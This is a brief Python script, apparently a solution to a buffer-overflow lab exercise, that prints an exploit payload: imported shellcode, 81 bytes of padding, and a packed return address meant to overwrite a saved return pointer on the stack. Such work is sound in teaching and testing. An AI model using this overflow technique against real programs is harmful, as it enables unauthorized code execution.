#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode+b"X"*81+pack("<I", 0xfffe9f68))
